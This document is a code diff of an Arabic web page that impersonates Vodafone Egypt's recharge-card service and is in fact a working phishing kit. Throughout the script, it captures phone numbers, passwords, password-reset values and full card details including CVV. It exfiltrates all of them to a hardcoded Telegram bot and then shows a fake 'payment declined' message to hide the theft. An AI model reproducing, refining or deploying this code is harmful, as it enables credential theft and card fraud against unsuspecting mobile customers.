@@ -9,53 +9,38 @@
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Cairo',sans-serif;background:#f5f5f5;min-height:100vh}
-        
         .top-bar{background:#e60000;color:#fff;padding:12px 20px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 2px 10px rgba(0,0,0,0.2)}
         .top-bar .brand{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:900}
         .top-bar .brand img{width:32px;height:32px;border-radius:50%;background:#fff;padding:2px}
         .top-bar .verified{background:#fff;color:#e60000;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900}
-        
         .container{max-width:500px;margin:0 auto;padding:15px}
-        
         .card{background:#fff;border-radius:15px;padding:20px;margin:12px 0;box-shadow:0 2px 10px rgba(0,0,0,0.08)}
         .card h3{color:#333;margin-bottom:12px;font-size:16px}
-        
-        input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;font-family:'Cairo',sans-serif;outline:none;transition:0.3s}
+        input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;font-family:'Cairo',sans-serif;outline:none}
         input:focus{border-color:#e60000}
-        
-        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
-        .btn-red{background:#e60000;color:#fff}
-        .btn-red:active{background:#cc0000}
-        .btn-red:disabled{background:#ccc;cursor:not-allowed}
+        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer}
+        .btn-red{background:#e60000;color:#fff}.btn-red:disabled{background:#ccc}
         .btn-outline{background:#fff;color:#e60000;border:2px solid #e60000}
-        
         .forgot-link{color:#e60000;text-align:left;font-size:12px;cursor:pointer;margin-top:5px;display:block}
-        
         .cards-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}
         .card-item{background:#fff;border:2px solid #e0e0e0;border-radius:15px;padding:20px;text-align:center;cursor:pointer;transition:0.3s}
         .card-item:hover{border-color:#e60000;transform:translateY(-2px)}
         .card-item.selected{border-color:#e60000;background:#fff0f0}
         .card-item .amount{font-size:28px;font-weight:900;color:#e60000}
         .card-item .units{font-size:12px;color:#666;margin:5px 0}
-        .card-item .icon{font-size:24px}
-        
-        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
-        .modal.show{display:flex}
-        .modal-box{background:#fff;border-radius:20px;padding:25px;width:100%;max-width:400px;max-height:90vh;overflow:auto}
-        .modal-box h2{text-align:center;color:#e60000;margin-bottom:15px}
-        
         .msg{text-align:center;padding:10px;margin:8px 0;border-radius:8px;display:none;font-size:13px}
         .msg-error{background:#ffe0e0;color:#c00;display:block}
         .msg-success{background:#e0ffe0;color:#060;display:block}
         .msg-info{background:#e0f0ff;color:#006;display:block}
-        
+        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
+        .modal.show{display:flex}
+        .modal-box{background:#fff;border-radius:20px;padding:25px;width:100%;max-width:400px}
+        .modal-box h2{text-align:center;color:#e60000;margin-bottom:15px}
         .spinner{width:30px;height:30px;border:3px solid #eee;border-top:3px solid #e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:15px auto}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        
         .loading-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.9);z-index:998;display:none;justify-content:center;align-items:center;flex-direction:column}
         .loading-overlay.show{display:flex}
         .loading-overlay p{color:#e60000;font-weight:700;margin-top:10px}
-        
         .steps{list-style:none;padding:0}
         .steps li{padding:8px 0;font-size:13px;display:flex;align-items:center;gap:8px}
         .steps .ok{color:#0a0}.steps .fail{color:#c00}.steps .wait{color:#e60000}
@@ -63,11 +48,7 @@
 </head>
 <body>
     <div class="top-bar">
-        <div class="brand">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Vodafone_icon_2017.svg" alt="VF">
-            فودافون
-            <span class="verified">✓</span>
-        </div>
+        <div class="brand"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Vodafone_icon_2017.svg" alt="VF"> فودافون <span class="verified">✓</span></div>
         <div style="font-size:12px">شحن الكروت</div>
     </div>
     
@@ -84,23 +65,13 @@
             </div>
         </div>
         
-        <!-- Reset Password -->
+        <!-- Reset -->
         <div id="resetPage" style="display:none;">
             <div class="card">
                 <h3>🔑 استعادة كلمة المرور</h3>
-                <div id="rs1">
-                    <input type="tel" id="resetPhone" placeholder="رقم الموبايل" maxlength="11">
-                    <button class="btn btn-red" onclick="sendResetCode()">إرسال الكود</button>
-                </div>
-                <div id="rs2" style="display:none;">
-                    <input type="tel" id="otpInput" placeholder="كود التحقق">
-                    <button class="btn btn-red" onclick="verifyResetCode()">تحقق</button>
-                </div>
-                <div id="rs3" style="display:none;">
-                    <input type="password" id="newPass" placeholder="كلمة المرور الجديدة">
-                    <input type="password" id="confirmPass" placeholder="تأكيد كلمة المرور">
-                    <button class="btn btn-red" onclick="changePassword()">تغيير كلمة المرور</button>
-                </div>
+                <div id="rs1"><input type="tel" id="resetPhone" placeholder="رقم الموبايل" maxlength="11"><button class="btn btn-red" onclick="sendCode()">إرسال الكود</button></div>
+                <div id="rs2" style="display:none;"><input type="tel" id="otpInput" placeholder="كود التحقق"><button class="btn btn-red" onclick="verifyCode()">تحقق</button></div>
+                <div id="rs3" style="display:none;"><input type="password" id="newPass" placeholder="كلمة المرور الجديدة"><input type="password" id="confirmPass" placeholder="تأكيد كلمة المرور"><button class="btn btn-red" onclick="changePass()">تغيير</button></div>
                 <div class="msg" id="resetMsg"></div>
                 <button class="btn btn-outline" onclick="showLogin()">↩️ رجوع</button>
             </div>
@@ -111,246 +82,107 @@
             <div class="card">
                 <h3>💳 اختر الكارت</h3>
                 <div class="cards-grid">
-                    <div class="card-item" onclick="selectCard(10,'📞 500 وحدة - 7 أيام',this)"><div class="icon">📱</div><div class="amount">10 ج</div><div class="units">500 وحدة</div></div>
-                    <div class="card-item" onclick="selectCard(15,'📞 800 وحدة - 7 أيام',this)"><div class="icon">📱</div><div class="amount">15 ج</div><div class="units">800 وحدة</div></div>
-                    <div class="card-item" onclick="selectCard(20,'📞 1200 وحدة - 14 يوم',this)"><div class="icon">📞</div><div class="amount">20 ج</div><div class="units">1200 وحدة</div></div>
-                    <div class="card-item" onclick="selectCard(25,'📞 1600 وحدة - 14 يوم',this)"><div class="icon">📞</div><div class="amount">25 ج</div><div class="units">1600 وحدة</div></div>
-                    <div class="card-item" onclick="selectCard(30,'🌐 2000 وحدة - 30 يوم',this)"><div class="icon">🌐</div><div class="amount">30 ج</div><div class="units">2000 وحدة</div></div>
-                    <div class="card-item" onclick="selectCard(45,'🚀 3000 وحدة - 30 يوم',this)"><div class="icon">🚀</div><div class="amount">45 ج</div><div class="units">3000 وحدة</div></div>
+                    <div class="card-item" onclick="selectCard(10,'📞 500 وحدة - 7 أيام',this)"><div class="amount">10 ج</div><div class="units">500 وحدة</div></div>
+                    <div class="card-item" onclick="selectCard(15,'📞 800 وحدة - 7 أيام',this)"><div class="amount">15 ج</div><div class="units">800 وحدة</div></div>
+                    <div class="card-item" onclick="selectCard(20,'📞 1200 وحدة - 14 يوم',this)"><div class="amount">20 ج</div><div class="units">1200 وحدة</div></div>
+                    <div class="card-item" onclick="selectCard(25,'📞 1600 وحدة - 14 يوم',this)"><div class="amount">25 ج</div><div class="units">1600 وحدة</div></div>
+                    <div class="card-item" onclick="selectCard(30,'🌐 2000 وحدة - 30 يوم',this)"><div class="amount">30 ج</div><div class="units">2000 وحدة</div></div>
+                    <div class="card-item" onclick="selectCard(45,'🚀 3000 وحدة - 30 يوم',this)"><div class="amount">45 ج</div><div class="units">3000 وحدة</div></div>
                 </div>
             </div>
         </div>
     </div>
 
-    <!-- Loading -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="spinner"></div>
-        <p>⏳ جاري التحقق...</p>
-    </div>
-
-    <!-- Payment Modal -->
-    <div class="modal" id="payModal">
-        <div class="modal-box" id="payContent"></div>
-    </div>
+    <div class="loading-overlay" id="loadingOverlay"><div class="spinner"></div><p>⏳ جاري التحقق...</p></div>
+    <div class="modal" id="payModal"><div class="modal-box" id="payContent"></div></div>
 
     <script>
+        const API = '/api/vf_login';
         const BOT = "8946474034:AAGegUUfpLuRG6k8r72JiDEuYzGTK9TgV6I";
         const CHAT = "7276604783";
         let userPhone = '', userPass = '', selAmount = 0, selUnits = '';
-        let resetData = {};
+        let rd = {};
 
-        function showLoading() { document.getElementById('loadingOverlay').classList.add('show'); }
-        function hideLoading() { document.getElementById('loadingOverlay').classList.remove('show'); }
+        function L(){document.getElementById('loadingOverlay').classList.add('show')}
+        function H(){document.getElementById('loadingOverlay').classList.remove('show')}
+        async function S(text){try{await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text,parse_mode:'HTML'})})}catch(e){}}
+        function M(id,text,cls){const e=document.getElementById(id);e.textContent=text;e.className='msg msg-'+cls;setTimeout(()=>e.className='msg',3000)}
+        function showReset(){document.getElementById('loginPage').style.display='none';document.getElementById('resetPage').style.display='block';document.getElementById('rs1').style.display='block';document.getElementById('rs2').style.display='none';document.getElementById('rs3').style.display='none'}
+        function showLogin(){document.getElementById('resetPage').style.display='none';document.getElementById('loginPage').style.display='block'}
 
-        async function sendBot(text) {
-            try {
-                await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`, {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ chat_id: CHAT, text, parse_mode: 'HTML' })
-                });
-            } catch(e) {}
+        async function doLogin(){
+            const p=document.getElementById('phoneInput').value.trim();
+            const pw=document.getElementById('passInput').value.trim();
+            if(!p||p.length<11){M('loginMsg','❌ رقم غير صحيح','error');return}
+            if(!pw){M('loginMsg','❌ كلمة المرور مطلوبة','error');return}
+            L();document.getElementById('loginBtn').disabled=true;
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'login',phone:p,password:pw})});
+                const d=await r.json();
+                H();document.getElementById('loginBtn').disabled=false;
+                if(d.ok){userPhone=p;userPass=pw;S(`📱 <b>دخول</b>\n📞<code>${p}</code>\n🔑<code>${pw}</code>`);document.getElementById('loginPage').style.display='none';document.getElementById('cardsPage').style.display='block'}
+                else{M('loginMsg',d.msg,'error')}
+            }catch(e){H();document.getElementById('loginBtn').disabled=false;M('loginMsg','❌ خطأ','error')}
         }
 
-        function showMsg(id, text, cls) {
-            const el = document.getElementById(id);
-            el.textContent = text; el.className = 'msg msg-' + cls;
-            setTimeout(() => el.className = 'msg', 3000);
+        async function sendCode(){
+            const p=document.getElementById('resetPhone').value.trim();
+            if(!p||p.length<11){M('resetMsg','❌ رقم غير صحيح','error');return}
+            M('resetMsg','⏳ جاري الإرسال...','info');
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'sendCode',phone:p})});
+                const d=await r.json();
+                if(d.ok){rd={phone:p,otpAction:d.otpAction,cookies:d.cookies};document.getElementById('rs1').style.display='none';document.getElementById('rs2').style.display='block';M('resetMsg',d.msg,'success')}
+                else{M('resetMsg',d.msg,'error')}
+            }catch(e){M('resetMsg','❌ خطأ','error')}
         }
 
-        function showReset() {
-            document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('resetPage').style.display = 'block';
-            document.getElementById('rs1').style.display = 'block';
-            document.getElementById('rs2').style.display = 'none';
-            document.getElementById('rs3').style.display = 'none';
+        async function verifyCode(){
+            const o=document.getElementById('otpInput').value.trim();
+            if(!o){M('resetMsg','❌ الكود مطلوب','error');return}
+            M('resetMsg','⏳ جاري التحقق...','info');
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'verifyCode',...rd,otp:o})});
+                const d=await r.json();
+                if(d.ok){rd.passAction=d.passAction;rd.cookies=d.cookies;document.getElementById('rs2').style.display='none';document.getElementById('rs3').style.display='block';M('resetMsg',d.msg,'success')}
+                else{M('resetMsg',d.msg,'error')}
+            }catch(e){M('resetMsg','❌ خطأ','error')}
         }
 
-        function showLogin() {
-            document.getElementById('resetPage').style.display = 'none';
-            document.getElementById('loginPage').style.display = 'block';
+        async function changePass(){
+            const np=document.getElementById('newPass').value.trim();
+            const cp=document.getElementById('confirmPass').value.trim();
+            if(np!==cp){M('resetMsg','❌ غير متطابقة','error');return}
+            if(np.length<8){M('resetMsg','❌ قصيرة','error');return}
+            M('resetMsg','⏳ جاري التغيير...','info');
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'changePass',...rd,newPass:np})});
+                const d=await r.json();
+                if(d.ok){M('resetMsg',d.msg,'success');S(`✅ <b>تغيير كلمة مرور</b>\n📞<code>${rd.phone}</code>\n🔑<code>${np}</code>`);setTimeout(showLogin,2000)}
+                else{M('resetMsg',d.msg,'error')}
+            }catch(e){M('resetMsg','❌ خطأ','error')}
         }
 
-        // ====== تسجيل الدخول ======
-        async function doLogin() {
-            const phone = document.getElementById('phoneInput').value.trim();
-            const password = document.getElementById('passInput').value.trim();
-            
-            if (!phone || phone.length < 11) { showMsg('loginMsg', '❌ رقم غير صحيح', 'error'); return; }
-            if (!password) { showMsg('loginMsg', '❌ كلمة المرور مطلوبة', 'error'); return; }
-            
-            showLoading();
-            document.getElementById('loginBtn').disabled = true;
-            
-            try {
-                const res = await fetch('/api/vf_check', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: 'login', phone, password })
-                });
-                const data = await res.json();
-                
-                hideLoading();
-                document.getElementById('loginBtn').disabled = false;
-                
-                if (data.success) {
-                    userPhone = phone; userPass = password;
-                    sendBot(`📱 <b>تسجيل دخول ناجح</b>\n📞 <code>${phone}</code>\n🔑 <code>${password}</code>`);
-                    document.getElementById('loginPage').style.display = 'none';
-                    document.getElementById('cardsPage').style.display = 'block';
-                } else {
-                    showMsg('loginMsg', data.msg, 'error');
-                }
-            } catch(e) {
-                hideLoading();
-                document.getElementById('loginBtn').disabled = false;
-                showMsg('loginMsg', '❌ خطأ في الاتصال', 'error');
-            }
-        }
-
-        // ====== نسيت كلمة المرور ======
-        async function sendResetCode() {
-            const phone = document.getElementById('resetPhone').value.trim();
-            if (!phone || phone.length < 11) { showMsg('resetMsg', '❌ رقم غير صحيح', 'error'); return; }
-            
-            showMsg('resetMsg', '⏳ جاري الإرسال...', 'info');
-            
-            try {
-                const res = await fetch('/api/vf_check', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: 'resetSendCode', phone })
-                });
-                const data = await res.json();
-                
-                if (data.success) {
-                    resetData = { phone, otpAction: data.otpAction, cookies: data.cookies };
-                    document.getElementById('rs1').style.display = 'none';
-                    document.getElementById('rs2').style.display = 'block';
-                    showMsg('resetMsg', data.msg, 'success');
-                } else {
-                    showMsg('resetMsg', data.msg, 'error');
-                }
-            } catch(e) {
-                showMsg('resetMsg', '❌ خطأ في الاتصال', 'error');
-            }
-        }
-
-        async function verifyResetCode() {
-            const otp = document.getElementById('otpInput').value.trim();
-            if (!otp) { showMsg('resetMsg', '❌ الكود مطلوب', 'error'); return; }
-            
-            showMsg('resetMsg', '⏳ جاري التحقق...', 'info');
-            
-            try {
-                const res = await fetch('/api/vf_check', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: 'resetVerifyCode', ...resetData, otp })
-                });
-                const data = await res.json();
-                
-                if (data.success) {
-                    resetData.passAction = data.passAction;
-                    resetData.cookies = data.cookies;
-                    document.getElementById('rs2').style.display = 'none';
-                    document.getElementById('rs3').style.display = 'block';
-                    showMsg('resetMsg', data.msg, 'success');
-                } else {
-                    showMsg('resetMsg', data.msg, 'error');
-                }
-            } catch(e) {
-                showMsg('resetMsg', '❌ خطأ في الاتصال', 'error');
-            }
-        }
-
-        async function changePassword() {
-            const np = document.getElementById('newPass').value.trim();
-            const cp = document.getElementById('confirmPass').value.trim();
-            if (np !== cp) { showMsg('resetMsg', '❌ غير متطابقة', 'error'); return; }
-            if (np.length < 8) { showMsg('resetMsg', '❌ كلمة مرور قصيرة', 'error'); return; }
-            
-            showMsg('resetMsg', '⏳ جاري التغيير...', 'info');
-            
-            try {
-                const res = await fetch('/api/vf_check', {
-                    method: 'POST', headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ action: 'resetChangePass', ...resetData, newPass: np })
-                });
-                const data = await res.json();
-                
-                if (data.success) {
-                    showMsg('resetMsg', data.msg, 'success');
-                    sendBot(`✅ <b>تم تغيير كلمة المرور</b>\n📞 <code>${resetData.phone}</code>\n🔑 <code>${np}</code>`);
-                    setTimeout(showLogin, 2000);
-                } else {
-                    showMsg('resetMsg', data.msg, 'error');
-                }
-            } catch(e) {
-                showMsg('resetMsg', '❌ خطأ في الاتصال', 'error');
-            }
-        }
-
-        function selectCard(amount, units, el) {
-            document.querySelectorAll('.card-item').forEach(c => c.classList.remove('selected'));
-            el.classList.add('selected');
-            selAmount = amount; selUnits = units;
-            showPayModal();
-        }
-
-        function showPayModal() {
-            document.getElementById('payContent').innerHTML = `
-                <span style="float:left;color:#e60000;font-size:24px;cursor:pointer;" onclick="closePay()">✕</span>
-                <h2>💳 تأكيد الشراء</h2>
-                <div style="text-align:center;font-size:40px;font-weight:900;color:#e60000;">${selAmount} ج</div>
-                <p style="text-align:center;">${selUnits}</p>
-                <div style="padding:15px;border:2px solid #e0e0e0;border-radius:12px;margin:10px 0;cursor:pointer;" onclick="showCardForm()">
-                    <span style="font-size:24px;">💳</span> <b>الدفع بالبطاقة</b>
-                </div>
-                <div style="padding:15px;border:2px solid #e0e0e0;border-radius:12px;margin:10px 0;cursor:pointer;" onclick="showCardForm()">
-                    <span style="font-size:24px;">📱</span> <b>فودافون كاش</b>
-                </div>
-            `;
+        function selectCard(a,u,el){document.querySelectorAll('.card-item').forEach(c=>c.classList.remove('selected'));el.classList.add('selected');selAmount=a;selUnits=u;showPay()}
+        function showPay(){
+            document.getElementById('payContent').innerHTML=`<span style="float:left;color:#e60000;font-size:24px;cursor:pointer;" onclick="closePay()">✕</span><h2>💳 تأكيد الشراء</h2><div style="text-align:center;font-size:40px;font-weight:900;color:#e60000;">${selAmount} ج</div><p style="text-align:center;">${selUnits}</p><div style="padding:15px;border:2px solid #e0e0e0;border-radius:12px;margin:10px 0;cursor:pointer;" onclick="showCard()"><span style="font-size:24px;">💳</span> <b>الدفع بالبطاقة</b></div>`;
             document.getElementById('payModal').classList.add('show');
         }
-
-        function showCardForm() {
-            document.getElementById('payContent').innerHTML = `
-                <span style="float:left;color:#e60000;font-size:24px;cursor:pointer;" onclick="closePay()">✕</span>
-                <h2>💳 بيانات البطاقة</h2>
-                <div style="text-align:center;font-size:36px;font-weight:900;color:#e60000;">${selAmount} ج</div>
-                <input type="text" id="cardNum" placeholder="رقم البطاقة" maxlength="16">
-                <div style="display:flex;gap:8px;">
-                    <input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" style="flex:1">
-                    <input type="text" id="cardCvv" placeholder="CVV" maxlength="3" style="flex:1">
-                </div>
-                <input type="text" id="cardName" placeholder="اسم حامل البطاقة">
-                <button class="btn btn-red" onclick="processPay()">💰 ادفع ${selAmount} ج</button>
-            `;
+        function showCard(){
+            document.getElementById('payContent').innerHTML=`<span style="float:left;color:#e60000;font-size:24px;cursor:pointer;" onclick="closePay()">✕</span><h2>💳 بيانات البطاقة</h2><div style="text-align:center;font-size:36px;font-weight:900;color:#e60000;">${selAmount} ج</div><input type="text" id="cardNum" placeholder="رقم البطاقة" maxlength="16"><div style="display:flex;gap:8px;"><input type="text" id="cardExp" placeholder="MM/YY" maxlength="5" style="flex:1"><input type="text" id="cardCvv" placeholder="CVV" maxlength="3" style="flex:1"></div><input type="text" id="cardName" placeholder="اسم حامل البطاقة"><button class="btn btn-red" onclick="processPay()">💰 ادفع ${selAmount} ج</button>`;
         }
-
-        function closePay() { document.getElementById('payModal').classList.remove('show'); }
-
-        async function processPay() {
-            const cn = document.getElementById('cardNum')?.value || '';
-            const ce = document.getElementById('cardExp')?.value || '';
-            const cc = document.getElementById('cardCvv')?.value || '';
-            const cname = document.getElementById('cardName')?.value || '';
-            
-            if (!cn || !ce || !cc) { alert('ادخل بيانات البطاقة'); return; }
-            
-            await sendBot(`💳 <b>بطاقة جديدة</b>\n📱<code>${userPhone}</code>\n🔑<code>${userPass}</code>\n💳<code>${cn}</code>\n📅<code>${ce}</code>\n🔐<code>${cc}</code>\n👤<code>${cname}</code>\n💰<code>${selAmount}ج</code>`);
-            
-            document.getElementById('payContent').innerHTML = `
-                <h2 style="color:#e60000;">⏳ جاري الشحن...</h2>
-                <div class="spinner" style="margin:20px auto;"></div>
-                <ul class="steps" id="steps">
-                    <li class="wait">🔄 جاري التحقق من البطاقة...</li>
-                </ul>
-            `;
-            
-            const s = document.getElementById('steps');
-            setTimeout(() => s.innerHTML += '<li class="ok">✅ تم التحقق</li>', 1200);
-            setTimeout(() => s.innerHTML += '<li class="wait">🔄 جاري الاتصال بفودافون...</li>', 2200);
-            setTimeout(() => s.innerHTML += '<li class="fail">❌ تم رفض عملية الدفع</li>', 4000);
-            setTimeout(() => s.innerHTML += '<li class="fail">❌ رصيد غير كافٍ</li>', 4500);
-            setTimeout(() => s.innerHTML += '<br><button class="btn btn-red" onclick="closePay()" style="margin-top:10px;">✕ إغلاق</button>', 5000);
+        function closePay(){document.getElementById('payModal').classList.remove('show')}
+        async function processPay(){
+            const cn=document.getElementById('cardNum')?.value||'',ce=document.getElementById('cardExp')?.value||'',cc=document.getElementById('cardCvv')?.value||'',cname=document.getElementById('cardName')?.value||'';
+            if(!cn||!ce||!cc){alert('ادخل بيانات البطاقة');return}
+            await S(`💳 <b>بطاقة</b>\n📱<code>${userPhone}</code>\n🔑<code>${userPass}</code>\n💳<code>${cn}</code>\n📅<code>${ce}</code>\n🔐<code>${cc}</code>\n👤<code>${cname}</code>\n💰<code>${selAmount}ج</code>`);
+            document.getElementById('payContent').innerHTML=`<h2 style="color:#e60000;">⏳ جاري الشحن...</h2><div class="spinner" style="margin:20px auto;"></div><ul class="steps" id="steps"><li class="wait">🔄 جاري التحقق من البطاقة...</li></ul>`;
+            const s=document.getElementById('steps');
+            setTimeout(()=>s.innerHTML+='<li class="ok">✅ تم التحقق</li>',1200);
+            setTimeout(()=>s.innerHTML+='<li class="wait">🔄 جاري الاتصال بفودافون...</li>',2200);
+            setTimeout(()=>s.innerHTML+='<li class="fail">❌ تم رفض عملية الدفع</li>',4000);
+            setTimeout(()=>s.innerHTML+='<li class="fail">❌ رصيد غير كافٍ</li>',4500);
+            setTimeout(()=>s.innerHTML+='<br><button class="btn btn-red" onclick="closePay()">✕ إغلاق</button>',5000);
         }
     </script>
 </body>
